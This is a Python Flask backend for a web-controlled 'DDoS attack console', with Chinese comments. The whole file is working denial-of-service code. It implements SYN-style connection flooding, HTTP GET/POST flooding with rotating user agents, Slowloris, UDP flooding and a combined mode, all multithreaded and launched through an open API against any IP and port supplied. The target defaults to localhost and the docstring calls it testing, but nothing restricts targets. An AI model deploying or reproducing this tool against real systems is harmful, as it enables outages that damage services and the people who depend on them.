"""
DDoS 攻擊控制台 - Flask 後端
提供 Web API 來執行攻擊測試
"""
from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import threading
import socket
import time
import random
import struct
from collections import Counter
import os

app = Flask(__name__)
CORS(app)

# 全局變量
attack_running = False
attack_stats = {
    'packets': 0,
    'connections': 0,
    'requests': 0,
    'errors': Counter()
}
stats_lock = threading.Lock()
attack_threads = []

def increment_stat(stat_name, value=1):
    """增加統計數據"""
    global attack_stats
    with stats_lock:
        if stat_name in attack_stats:
            attack_stats[stat_name] += value

def add_error(error_type):
    """記錄錯誤"""
    global attack_stats
    with stats_lock:
        attack_stats['errors'][error_type] += 1

# ==================== 攻擊實現 ====================

def syn_flood_attack(target_ip, target_port, duration):
    """SYN Flood 簡化版"""
    global attack_running
    print(f"[SYN] 線程啟動: {target_ip}:{target_port}")
    
    sockets_pool = []
    start_time = time.time()
    
    while attack_running and (time.time() - start_time) < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            sock.setblocking(False)
            
            try:
                sock.connect((target_ip, target_port))
            except (BlockingIOError, socket.error):
                pass
            
            increment_stat('connections')
            
            if len(sockets_pool) < 50:
                sockets_pool.append(sock)
            else:
                try:
                    sock.close()
                except:
                    pass
            
            if len(sockets_pool) >= 50:
                old_sock = sockets_pool.pop(0)
                try:
                    old_sock.close()
                except:
                    pass
                    
        except Exception as e:
            add_error(f"SYN: {type(e).__name__}")
            time.sleep(0.01)
    
    for sock in sockets_pool:
        try:
            sock.close()
        except:
            pass
    
    print(f"[SYN] 線程停止")

def http_flood_attack(target_ip, target_port, method, duration):
    """HTTP Flood 攻擊"""
    global attack_running
    import requests
    
    print(f"[HTTP {method}] 線程啟動: {target_ip}:{target_port}")
    
    session = requests.Session()
    target_url = f"http://{target_ip}:{target_port}"
    
    paths = ["/", "/api", "/search", "/login", "/data"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    ]
    
    start_time = time.time()
    
    while attack_running and (time.time() - start_time) < duration:
        try:
            url = target_url + random.choice(paths)
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "*/*",
                "Connection": "keep-alive"
            }
            
            if method == "GET":
                response = session.get(url, headers=headers, timeout=2)
            elif method == "POST":
                data = {"test": random.randint(1, 10000)}
                response = session.post(url, json=data, headers=headers, timeout=2)
            
            increment_stat('requests')
            increment_stat('connections')
            
        except requests.exceptions.Timeout:
            add_error("HTTP Timeout")
        except requests.exceptions.ConnectionError:
            add_error("HTTP Connection Error")
        except Exception as e:
            add_error(f"HTTP: {type(e).__name__}")
    
    print(f"[HTTP {method}] 線程停止")

def slowloris_attack(target_ip, target_port, duration):
    """Slowloris 攻擊"""
    global attack_running
    print(f"[Slowloris] 線程啟動: {target_ip}:{target_port}")
    
    sockets = []
    
    # 創建半完成的 HTTP 請求
    for _ in range(50):
        if not attack_running:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            
            sockets.append(sock)
            increment_stat('connections')
        except:
            pass
    
    start_time = time.time()
    
    # 持續發送不完整的標頭
    while attack_running and (time.time() - start_time) < duration:
        try:
            for sock in list(sockets):
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    increment_stat('packets')
                except:
                    sockets.remove(sock)
            
            time.sleep(10)
            
        except Exception as e:
            add_error(f"Slowloris: {type(e).__name__}")
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    print(f"[Slowloris] 線程停止")

def udp_flood_attack(target_ip, target_port, duration):
    """UDP Flood 攻擊"""
    global attack_running
    print(f"[UDP] 線程啟動: {target_ip}:{target_port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as e:
        print(f"[UDP] Socket 創建失敗: {e}")
        return
    
    payload_sizes = [64, 128, 256, 512, 1024]
    start_time = time.time()
    
    while attack_running and (time.time() - start_time) < duration:
        try:
            size = random.choice(payload_sizes)
            payload = random.randbytes(size)
            sock.sendto(payload, (target_ip, target_port))
            increment_stat('packets')
        except Exception as e:
            add_error(f"UDP: {type(e).__name__}")
            time.sleep(0.001)
    
    sock.close()
    print(f"[UDP] 線程停止")

# ==================== API 端點 ====================

@app.route('/')
def index():
    """返回控制台頁面"""
    html_path = os.path.join(os.path.dirname(__file__), 'attack_control.html')
    with open(html_path, 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/api/start', methods=['POST'])
def start_attack():
    """啟動攻擊"""
    global attack_running, attack_threads, attack_stats
    
    if attack_running:
        return jsonify({'success': False, 'error': '攻擊已在運行中'})
    
    data = request.json
    attack_type = data.get('type')
    target_ip = data.get('ip', '127.0.0.1')
    target_port = int(data.get('port', 8000))
    udp_port = int(data.get('udpPort', 9001))
    thread_count = int(data.get('threads', 50))
    duration = int(data.get('duration', 30))
    
    # 重置統計
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'connections': 0,
            'requests': 0,
            'errors': Counter()
        }
    
    attack_running = True
    attack_threads = []
    
    # 根據攻擊類型啟動線程
    if attack_type == 'syn':
        for _ in range(thread_count):
            t = threading.Thread(target=syn_flood_attack, args=(target_ip, target_port, duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    elif attack_type == 'http-get':
        for _ in range(thread_count):
            t = threading.Thread(target=http_flood_attack, args=(target_ip, target_port, 'GET', duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    elif attack_type == 'http-post':
        for _ in range(thread_count):
            t = threading.Thread(target=http_flood_attack, args=(target_ip, target_port, 'POST', duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    elif attack_type == 'slowloris':
        for _ in range(min(thread_count // 5, 10)):  # Slowloris 不需要太多線程
            t = threading.Thread(target=slowloris_attack, args=(target_ip, target_port, duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    elif attack_type == 'udp':
        for _ in range(thread_count):
            t = threading.Thread(target=udp_flood_attack, args=(target_ip, udp_port, duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    elif attack_type == 'combo':
        # SYN Flood
        for _ in range(thread_count // 3):
            t = threading.Thread(target=syn_flood_attack, args=(target_ip, target_port, duration), daemon=True)
            t.start()
            attack_threads.append(t)
        
        # HTTP Flood
        for _ in range(thread_count // 3):
            t = threading.Thread(target=http_flood_attack, args=(target_ip, target_port, 'GET', duration), daemon=True)
            t.start()
            attack_threads.append(t)
        
        # Slowloris
        for _ in range(5):
            t = threading.Thread(target=slowloris_attack, args=(target_ip, target_port, duration), daemon=True)
            t.start()
            attack_threads.append(t)
    
    else:
        attack_running = False
        return jsonify({'success': False, 'error': '未知的攻擊類型'})
    
    return jsonify({
        'success': True,
        'message': f'已啟動 {len(attack_threads)} 個攻擊線程'
    })

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """停止攻擊"""
    global attack_running
    attack_running = False
    
    # 等待線程結束
    for t in attack_threads:
        t.join(timeout=1)
    
    return jsonify({
        'success': True,
        'message': '攻擊已停止'
    })

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """獲取統計數據"""
    with stats_lock:
        return jsonify({
            'packets': attack_stats['packets'],
            'connections': attack_stats['connections'],
            'requests': attack_stats['requests'],
            'errors': dict(attack_stats['errors'])
        })

if __name__ == '__main__':
    print("="*80)
    print("💣 DDoS 攻擊控制台 - Flask 後端")
    print("="*80)
    print("啟動伺服器於: http://localhost:5000")
    print("請在瀏覽器中打開控制台頁面")
    print("="*80)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
